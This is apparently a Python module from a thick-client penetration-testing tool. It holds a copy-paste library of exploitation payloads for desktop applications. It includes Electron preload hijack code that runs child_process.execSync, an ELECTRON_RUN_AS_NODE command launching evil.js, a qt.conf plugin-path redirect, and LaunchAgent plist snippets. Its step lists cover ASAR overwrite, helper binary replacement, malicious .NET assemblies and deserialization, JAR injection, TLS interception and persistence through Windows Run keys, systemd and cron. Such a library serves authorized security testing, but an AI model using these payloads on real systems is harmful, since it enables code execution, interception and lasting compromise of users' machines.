"""
Preconfigured payloads to confirm basic exploitation (first-of-its-kind for thick-client tooling).
One payload per surface: copy-paste or use with matched paths to validate the attack surface.
"""
from typing import List, Dict, Any

# Per-surface payloads: name, description, type (steps | file | script | request), payload text or template.
# Use {{path}} or {{paths}} in payload for substitution when matched_paths are available.
PRECONFIGURED_PAYLOADS: Dict[str, List[Dict[str, Any]]] = {
    "electron_preload": [
        {
            "name": "Preload path hijack (confirm)",
            "description": "Replace or prepend to preload path; app loads attacker script in renderer.",
            "type": "steps",
            "payload": "1. Locate preload path from matched_paths or app.asar unpack.\n2. If writable: drop preload.js that does require('child_process').execSync('id').\n3. Or set ELECTRON_RUN_AS_NODE + malicious script; relaunch app.\n4. Confirm: renderer runs your code (e.g. alert, reverse shell).",
            "reference": "Electron preload trust boundary; CWE-427",
        },
        {
            "name": "Minimal Node preload PoC",
            "description": "Minimal preload.js to confirm execution in renderer.",
            "type": "file",
            "payload": "// Save as preload.js, replace target's preload or use path override\nprocess.once('loaded', () => {\n  const { execSync } = require('child_process');\n  try { global.poc = execSync('id', { encoding: 'utf8' }); } catch(e) { global.poc = e.message; }\n});\n",
            "reference": "Confirm code execution in Electron renderer",
        },
    ],
    "preload_write": [
        {
            "name": "ASAR overwrite / unpacked dir",
            "description": "If app.asar or app.asar.unpacked is writable, inject or replace preload.",
            "type": "steps",
            "payload": "1. Check matched_paths for app.asar, preload.js, asar.unpacked.\n2. If writable: copy malicious preload into unpacked dir; or repack asar with modified preload path.\n3. Relaunch app; confirm execution.",
            "reference": "ASAR write + preload chain",
        },
    ],
    "electron_helper": [
        {
            "name": "Helper process / crashpad",
            "description": "Lateral movement into helper binary; check for IPC or exec of attacker-controlled input.",
            "type": "steps",
            "payload": "1. From matched_paths identify helper (e.g. crashpad_handler, *.framework).\n2. Fuzz IPC or command-line args if app passes user input to helper.\n3. Or replace helper binary if writable (DLL hijack style).\n4. Confirm: code runs in helper context.",
            "reference": "Electron helper trust boundary; CWE-269",
        },
    ],
    "network_mitm": [
        {
            "name": "Proxy + TLS bypass",
            "description": "Point app at Burp; if ATS exceptions or TLS disabled, traffic is interceptable.",
            "type": "steps",
            "payload": "1. Set HTTP_PROXY / HTTPS_PROXY to Burp (e.g. 127.0.0.1:8080).\n2. Install Burp CA if app validates certs; or rely on NSExceptionAllowsInsecureHTTPLoads / disabled cert validation.\n3. Relaunch app; trigger HTTPS requests.\n4. Confirm: requests appear in Burp.",
            "reference": "macOS ATS; Electron ignore-certificate-errors",
        },
    ],
    "qt_rpath_plugin_drop": [
        {
            "name": "qt.conf + plugin path",
            "description": "If plugin dir or qt.conf location is writable, point to attacker plugin.",
            "type": "file",
            "payload": "[Paths]\nPlugins=/tmp/evil_qt_plugins\n",
            "reference": "Qt plugin search; CWE-427",
        },
        {
            "name": "Steps to confirm",
            "type": "steps",
            "description": "Drop qt.conf or writable plugin .so/.dylib; relaunch app.",
            "payload": "1. From matched_paths find Qt plugin dir or app dir for qt.conf.\n2. If writable: create qt.conf with Plugins=/path/to/your/plugin_dir.\n3. Build minimal Qt plugin (or use existing PoC .so); place in that dir.\n4. Relaunch app; confirm plugin load.",
            "reference": "Qt rpath / plugin hijack",
        },
    ],
    "macos_launch_persistence": [
        {
            "name": "LaunchAgent plist drop",
            "description": "User LaunchAgents dir writable → plist that runs your script on login.",
            "type": "steps",
            "payload": "1. Create ~/Library/LaunchAgents/com.test.poc.plist with RunAtLoad and your script.\n2. Log out/in or launchctl load.\n3. Confirm: script runs with user context.",
            "reference": "macOS LaunchAgent; CWE-732",
        },
    ],
    "windows_persistence": [
        {
            "name": "Run key / startup",
            "description": "Registry Run or Startup folder to confirm persistence.",
            "type": "steps",
            "payload": "1. HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run or Startup folder.\n2. Add entry pointing to your executable or script.\n3. Reboot or re-login; confirm execution.",
            "reference": "Windows Run key; CWE-732",
        },
    ],
    "dotnet_managed": [
        {
            "name": "Assembly load / deserialization",
            "description": "If app loads assemblies from writable path or deserializes untrusted data.",
            "type": "steps",
            "payload": "1. Identify assembly load paths or serialization endpoints from matched_paths/refs.\n2. Drop malicious assembly or craft serialized payload (BinaryFormatter, etc.).\n3. Trigger load or deserialization; confirm code execution.",
            "reference": "CWE-494, CWE-502",
        },
    ],
    "linux_persistence": [
        {
            "name": "systemd user service / cron",
            "description": "User systemd or crontab to confirm persistence.",
            "type": "steps",
            "payload": "1. Create ~/.config/systemd/user/poc.service or crontab entry.\n2. Enable/start or wait for cron; confirm script runs.",
            "reference": "systemd/cron; CWE-732",
        },
    ],
    "jar_archive": [
        {
            "name": "JAR in classpath / manifest",
            "description": "If app loads JAR from writable path or URL.",
            "type": "steps",
            "payload": "1. From matched_paths find JARs or manifest Class-Path.\n2. Add or replace JAR with class that runs in static initializer (e.g. Runtime.getRuntime().exec).\n3. Relaunch; confirm execution.",
            "reference": "CWE-427, JAR trust",
        },
    ],
}


# Surface -> category for HackBar-style payload library
_SURFACE_TO_CATEGORY = {
    "electron_preload": "Electron",
    "preload_write": "Electron",
    "electron_helper": "Electron",
    "network_mitm": "Network",
    "qt_rpath_plugin_drop": "Qt",
    "macos_launch_persistence": "Persistence",
    "windows_persistence": "Persistence",
    "linux_persistence": "Persistence",
    "dotnet_managed": ".NET",
    "jar_archive": "JAR",
}


def get_payloads_for_surface(surface_id: str) -> List[Dict[str, Any]]:
    """Return preconfigured payloads for a surface (for confirm-exploitation flow)."""
    return list(PRECONFIGURED_PAYLOADS.get(surface_id, []))


def get_payload_library() -> List[Dict[str, Any]]:
    """
    Return full payload library for HackBar-style UI: flat list with category.
    Each item: category, name, description, payload, type, reference [, surface].
    """
    out: List[Dict[str, Any]] = []
    for surface_id, payload_list in PRECONFIGURED_PAYLOADS.items():
        cat = _SURFACE_TO_CATEGORY.get(surface_id, "Other")
        for p in payload_list:
            entry = {
                "category": cat,
                "name": p.get("name") or "",
                "description": p.get("description") or "",
                "payload": p.get("payload") or "",
                "type": p.get("type") or "steps",
                "reference": p.get("reference") or "",
                "surface": surface_id,
            }
            out.append(entry)
    # Add extra copy-paste payloads for thick-client (HackBar-style one-liners/snippets)
    _append_extra_payloads(out)
    return out


def _append_extra_payloads(out: List[Dict[str, Any]]) -> None:
    """Append additional thick-client payload snippets for the library."""
    extras = [
        {
            "category": "Electron",
            "name": "Preload execSync one-liner",
            "description": "Minimal preload snippet: run command and expose result.",
            "payload": "process.once('loaded',()=>{require('child_process').execSync('id',{encoding:'utf8'});});",
            "type": "script",
            "reference": "Electron renderer RCE",
        },
        {
            "category": "Electron",
            "name": "ELECTRON_RUN_AS_NODE",
            "description": "Run app as Node and execute script (if app supports).",
            "payload": "ELECTRON_RUN_AS_NODE=1 /path/to/app/Electron /path/to/evil.js",
            "type": "script",
            "reference": "Electron CVE-2018-1000136",
        },
        {
            "category": ".NET",
            "name": "Type.GetType config",
            "description": "Example .config snippet that loads type from assembly.",
            "payload": "<add key=\"evil\" value=\"Namespace.TypeName, AssemblyName\"/>",
            "type": "file",
            "reference": "Type.GetType / assembly load",
        },
        {
            "category": "Persistence",
            "name": "LaunchAgent plist (minimal)",
            "description": "Minimal RunAtLoad plist for macOS.",
            "payload": "<key>RunAtLoad</key><true/><key>ProgramArguments</key><array><string>/tmp/poc.sh</string></array>",
            "type": "file",
            "reference": "macOS LaunchAgent",
        },
        {
            "category": "Network",
            "name": "Proxy env",
            "description": "Force app to use Burp proxy.",
            "payload": "export HTTP_PROXY=http://127.0.0.1:8080 HTTPS_PROXY=http://127.0.0.1:8080",
            "type": "script",
            "reference": "MITM thick client",
        },
    ]
    for e in extras:
        e["surface"] = ""
        out.append(e)
